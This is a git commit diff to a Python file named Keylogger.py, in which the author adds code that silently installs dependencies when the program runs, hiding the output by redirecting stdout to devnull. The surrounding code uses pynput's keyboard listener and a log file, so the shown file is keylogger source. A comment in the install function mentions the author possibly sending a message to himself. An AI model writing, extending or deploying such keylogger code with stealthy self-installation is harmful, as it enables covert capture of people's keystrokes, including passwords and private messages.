22def33ba7e7bd1f6ffc5f24ff62add3a1d7b652
Ivan <ichen9380@gmail.com>
2025-06-22 23:06:11 +1000

    added install all the required imports upon running of the program

--- Keylogger.py
+++ Keylogger.py
@@ -2,8 +2,20 @@ from pynput import keyboard
 import time
 import os
 import subprocess
+import sys
 
+def install_requirements():
+    try:
+        subprocess.run([sys.executable, "-m", "pip", "install", "-r", "requirements.txt", "-q"], check=True)
+        subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "-q"], check=True)
+    except subprocess.CalledProcessError:
+        #perhaps send an message to myself
+        pass
 
+oldStdout = sys.stdout
+sys.stdout = open(os.devnull, "w")
+install_requirements()
+sys.stdout = oldStdout
 
 FILENAME = "log.txt"
 # maximum file size in MB to be read
@@ -37,7 +49,3 @@ def on_release(key):
     
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-
-# listener.start()
-# time.sleep(5)
-# listener.stop()
